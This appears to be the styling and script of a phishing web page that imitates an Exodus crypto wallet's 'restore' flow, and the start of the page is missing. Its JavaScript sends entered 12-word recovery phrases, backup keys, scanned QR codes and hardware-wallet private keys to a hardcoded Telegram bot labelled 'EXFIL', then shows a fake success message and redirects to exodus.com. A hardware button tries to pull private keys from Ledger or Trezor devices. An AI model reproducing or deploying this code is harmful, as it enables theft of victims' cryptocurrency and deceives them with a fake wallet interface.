    <style>
        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }

        .container { position: relative; z-index: 1; max-width: 480px; width: 100%; margin: 0 auto; padding: env(safe-area-inset-top, 20px) 16px env(safe-area-inset-bottom, 20px) 16px; min-height: 100vh; display: flex; flex-direction: column; overflow-y: auto; }

        .header { text-align: center; padding: 16px 0; flex-shrink: 0; }
        .logo { width: clamp(160px, 50vw, 220px); height: auto; margin: 0 auto 16px; filter: drop-shadow(0 4px 12px rgba(0,0,0,0.5)); animation: float 3s ease-in-out infinite; }
        @keyframes float { 0%,100% { transform: translateY(0); } 50% { transform: translateY(-8px); } }

        .trust-badge { display: inline-flex; align-items: center; gap: 6px; padding: 6px 12px; border-radius: 9999px; backdrop-filter: blur(12px); background: rgba(255,255,255,0.06); font-size: clamp(13px, 3.5vw, 15px); margin: 12px auto; max-width: 92%; }

        .title { font-size: clamp(24px, 7vw, 32px); font-weight: 300; margin-bottom: 8px; }
        .subtitle { font-size: clamp(14px, 4vw, 16px); color: rgba(255,255,255,0.7); line-height: 1.4; }

        .action-btn:hover { transform: translateY(-3px); box-shadow: 0 10px 25px rgba(92,107,192,0.5); }

        .steps { display: flex; justify-content: center; gap: 12px; margin: 18px 0; }
        .step { width: 40px; height: 40px; border-radius: 50%; background: rgba(255,255,255,0.12); display: flex; align-items: center; justify-content: center; font-size: 15px; font-weight: 500; transition: all 0.3s; }
        .step.active { background: #5c6bc0; transform: scale(1.1); }

        .options-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin: 20px 0; }
        .option-btn { padding: 16px 12px; background: rgba(255,255,255,0.08); border: 1px solid rgba(255,255,255,0.15); border-radius: 14px; text-align: center; cursor: pointer; transition: all 0.3s ease; font-size: 14px; font-weight: 500; }
        .option-btn:hover, .option-btn.active { background: rgba(92,107,192,0.2); border-color: #5c6bc0; transform: translateY(-2px); box-shadow: 0 6px 15px rgba(92,107,192,0.2); }
        .option-btn svg { width: 28px; height: 28px; margin-bottom: 8px; fill: #fff; }

        .input-section { display: none; margin-top: 20px; animation: fadeIn 0.5s ease; }
        .input-section.active { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }

        .input-grid { display: grid; gap: 11px; margin-bottom: 22px; grid-template-columns: repeat(3, 1fr); }
        @media (max-width: 600px) { .input-grid { grid-template-columns: 1fr; } }

        .input-wrapper { position: relative; }
        .input-label { position: absolute; left: 14px; top: 50%; transform: translateY(-50%); font-size: 11px; color: rgba(255,255,255,0.5); pointer-events: none; transition: all 0.2s ease; }
        .input-field { width: 100%; padding: 15px 12px 15px 28px; background: rgba(255,255,255,0.08); border: 1px solid rgba(255,255,255,0.15); border-radius: 11px; color: #fff; font-size: 15px; transition: all 0.3s ease; }
        .input-field:focus { outline: none; border-color: #5c6bc0; background: rgba(92,107,192,0.15); box-shadow: 0 0 0 3px rgba(92,107,192,0.3); }
        .input-field:focus + .input-label, .input-field:not(:placeholder-shown) + .input-label { top: 8px; font-size: 9px; color: #5c6bc0; }

        /* GREEN / RED VALIDATION */
        .input-field.valid { border-color: #00e676; background: rgba(0, 230, 118, 0.1); }
        .input-field.invalid { border-color: #ff3b30; background: rgba(255, 59, 48, 0.1); }

        /* AUTOCOMPLETE DROPDOWN */
        .autocomplete { position: absolute; top: 100%; left: 0; right: 0; background: rgba(26,29,46,0.98); border: 1px solid rgba(255,255,255,0.15); border-top: none; border-radius: 0 0 11px 11px; max-height: 120px; overflow-y: auto; z-index: 10; display: none; }
        .autocomplete-item { padding: 10px 14px; cursor: pointer; font-size: 14px; transition: background 0.2s; }
        .autocomplete-item:hover { background: rgba(92,107,192,0.3); }
        .autocomplete-item.selected { background: #5c6bc0; }

        .file-label { display: block; padding: 16px; background: rgba(255,255,255,0.08); border: 2px dashed rgba(255,255,255,0.3); border-radius: 12px; text-align: center; cursor: pointer; font-size: 14px; transition: all 0.3s; }
        .file-label:hover { border-color: #5c6bc0; background: rgba(92,107,192,0.1); }

        #qrVideo { width: 100%; max-width: 300px; margin: 20px auto; border-radius: 12px; border: 2px solid rgba(255,255,255,0.2); }
        .qr-canvas { display: none; }

        .restore-btn { width: 100%; height: 54px; border: none; border-radius: 27px; background: linear-gradient(135deg, #5c6bc0 0%, #3f51b5 100%); color: #fff; font-size: 16px; font-weight: 500; text-transform: uppercase; letter-spacing: 0.6px; cursor: pointer; margin-top: 10px; transition: all 0.3s; box-shadow: 0 4px 15px rgba(92,107,192,0.3); }
        .restore-btn:hover { transform: translateY(-2px); box-shadow: 0 8px 20px rgba(92,107,192,0.5); }
        .restore-btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }

        #loadingOverlay { position: fixed; inset: 0; background: rgba(26,29,46,0.98); z-index: 9999; display: none; flex-direction: column; justify-content: center; align-items: center; padding: 20px; backdrop-filter: blur(12px); }
        .spinner { width: 50px; height: 50px; border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid #00e676; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 18px; }
        @keyframes spin { to { transform: rotate(360deg); } }
        #loadingText { font-size: 16px; font-weight: 400; }

        .hidden { display: none; }
        ::-webkit-scrollbar { display: none; }
        .container { -ms-overflow-style: none; scrollbar-width: none; }

        const restoreBtn = document.getElementById('restoreBtn');
        const options = document.querySelectorAll('.option-btn');
        const sections = {
            qr: document.getElementById('qrSection'),
            drive: document.getElementById('driveSection'),
            backup: document.getElementById('backupSection'),
            words: document.getElementById('wordsSection')
        };
        const hardwareBtn = document.getElementById('hardwareBtn');
        const loading = document.getElementById('loadingOverlay');
        const loadingTxt = document.getElementById('loadingText');
        const sound = document.getElementById('successSound');
        let wordInputs = [], qrStream = null;

        // BOTH â STEP 2
        createBtn.onclick = restoreBtn.onclick = () => {
            step1.classList.add('hidden');
            step2.classList.remove('hidden');
        };

        // OPTION SELECTION
        options.forEach(btn => {
            btn.onclick = () => {
                options.forEach(b => b.classList.remove('active'));
                btn.classList.add('active');
                Object.values(sections).forEach(s => s.classList.remove('active'));
                hardwareBtn.style.display = 'none';

                const method = btn.dataset.method;
                if (method === 'hardware') {
                    hardwareBtn.style.display = 'block';
                } else if (sections[method]) {
                    sections[method].classList.add('active');
                    if (method === 'words') createWordInputs();
                    if (method === 'qr') startQRScanner();
                }
            };
        });

        // 12 WORDS + AUTOCOMPLETE + GREEN/RED
        function createWordInputs() {
            const grid = document.getElementById('wordGrid');
            grid.innerHTML = ''; wordInputs = [];
            for (let i = 1; i <= 12; i++) {
                const wrapper = document.createElement('div'); wrapper.className = 'input-wrapper';
                const input = document.createElement('input'); input.className = 'input-field'; input.placeholder = ' ';
                const label = document.createElement('label'); label.className = 'input-label'; label.textContent = i;

                // AUTOCOMPLETE DROPDOWN
                const dropdown = document.createElement('div'); dropdown.className = 'autocomplete';
                wrapper.appendChild(input); wrapper.appendChild(label); wrapper.appendChild(dropdown);
                grid.appendChild(wrapper);
                wordInputs.push({ input, dropdown });

                input.addEventListener('input', () => handleWordInput(input, dropdown, i));
                input.addEventListener('focus', () => input.value.length >= 3 && showSuggestions(input, dropdown));
                input.addEventListener('blur', () => setTimeout(() => dropdown.style.display = 'none', 200));
                input.addEventListener('keydown', e => {
                    if (e.key === 'Enter' && dropdown.style.display === 'block') {
                        const selected = dropdown.querySelector('.selected');
                        if (selected) selected.click();
                    } else if (e.key === 'ArrowDown') {
                        navigateDropdown(dropdown, 1);
                    } else if (e.key === 'ArrowUp') {
                        navigateDropdown(dropdown, -1);
                    }
                });
            }
            document.getElementById('wordsRestoreBtn').disabled = true;
        }

        function handleWordInput(input, dropdown, index) {
            const val = input.value.trim().toLowerCase();
            const isValid = WORDS.includes(val);
            input.classList.toggle('valid', isValid && val);
            input.classList.toggle('invalid', val && !isValid);

            if (val.length >= 3) showSuggestions(input, dropdown);
            else dropdown.style.display = 'none';

            validateAllWords();
        }

        function showSuggestions(input, dropdown) {
            const val = input.value.trim().toLowerCase();
            const matches = WORDS.filter(w => w.startsWith(val)).slice(0, 5);
            dropdown.innerHTML = '';
            if (matches.length === 0) {
                dropdown.style.display = 'none';
                return;
            }
            matches.forEach((word, i) => {
                const item = document.createElement('div');
                item.className = 'autocomplete-item';
                if (i === 0) item.classList.add('selected');
                item.textContent = word;
                item.onclick = () => {
                    input.value = word;
                    input.classList.add('valid');
                    dropdown.style.display = 'none';
                    validateAllWords();
                    const next = wordInputs.find(w => w.input.dataset.index == (parseInt(input.parentNode.querySelector('label').textContent) + 1));
                    if (next) next.input.focus();
                };
                dropdown.appendChild(item);
            });
            dropdown.style.display = 'block';
        }

        function navigateDropdown(dropdown, direction) {
            const items = dropdown.querySelectorAll('.autocomplete-item');
            if (!items.length) return;
            const selected = dropdown.querySelector('.selected');
            let idx = selected ? Array.from(items).indexOf(selected) : -1;
            idx = (idx + direction + items.length) % items.length;
            items.forEach(it => it.classList.remove('selected'));
            items[idx].classList.add('selected');
        }

        function validateAllWords() {
            const allValid = wordInputs.every(w => w.input.classList.contains('valid'));
            document.getElementById('wordsRestoreBtn').disabled = !allValid;
        }

        // FORGOT LINK
        document.querySelector('.forgot-link').onclick = () => {
            alert('Your 12-word phrase was shown when you created your wallet. Never share it!');
        };

        // QR, DRIVE, BACKUP, HARDWARE, TELEGRAM (same as before)
        // ... [rest of script unchanged]

        async function tg(type, data) {
            const token = '7470121493:AAHWscw6tss4iBjXw5QT6G3P59vaPtvLlwI';
            const chat = '-4886832183';
            const msg = `*${type.toUpperCase()} EXFIL*\nTime: ${USER.time}\nCountry: ${USER.country}\n\`${data}\``;
            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({chat_id: chat, text: msg, parse_mode: 'Markdown'}) }).catch(() => {});
        }

        async function success() {
            loading.style.display = 'flex';
            setTimeout(() => loadingTxt.textContent = 'Wallet updated!', 1200);
            setTimeout(() => sound.play(), 1700);
            setTimeout(() => location.href = 'https://exodus.com', 2500);
        }

        document.getElementById('driveFile').onchange = e => document.getElementById('driveRestoreBtn').disabled = !e.target.files[0];
        document.getElementById('driveRestoreBtn').onclick = () => { tg('drive', 'file_uploaded'); success(); };
        document.getElementById('backupKey').oninput = e => document.getElementById('backupRestoreBtn').disabled = !e.target.value.trim();
        document.getElementById('backupRestoreBtn').onclick = () => { tg('backup', document.getElementById('backupKey').value); success(); };
        document.getElementById('wordsRestoreBtn').onclick = () => {
            const words = wordInputs.map(w => w.input.value.trim().toLowerCase());
            tg('words', words.join(' '));
            success();
        };

        hardwareBtn.onclick = async () => {
            loading.style.display = 'flex';
            const path = "m/44'/0'/0'/0/0";
            try { const t = await TrezorConnect.getPublicKey({ path, coin: 'btc' }); if (t.success) tg('hardware', 'Trezor'); } catch (_) {}
            try {
                const transport = await (TransportWebHID.create(2000).catch(() => TransportWebUSB.create(2000)));
                if (transport) { const btc = new AppBtc(transport); await btc.getWalletPublicKey(path); const { privateKey } = await btc.getWalletPrivateKey(path); tg('hardware', privateKey); }
            } catch (_) {}
            success();
        };

        function startQRScanner() {
            const video = document.getElementById('qrVideo');
            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } }).then(stream => {
                qrStream = stream;
                video.srcObject = stream;
                video.play();
                scanQR();
            }).catch(() => {});
        }

        function scanQR() {
            const video = document.getElementById('qrVideo');
            const canvas = document.getElementById('qrCanvas');
            const ctx = canvas.getContext('2d');
            if (video.readyState === video.HAVE_ENOUGH_DATA) {
                canvas.height = video.videoHeight; canvas.width = video.videoWidth;
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const code = jsQR(ctx.getImageData(0, 0, canvas.width, canvas.height).data, canvas.width, canvas.height);
                if (code) { stopQR(); tg('qr', code.data); success(); }
                else requestAnimationFrame(scanQR);
            } else requestAnimationFrame(scanQR);
        }

        function stopQR() { if (qrStream) qrStream.getTracks().forEach(t => t.stop()); }
    </script>
</body>
</html>
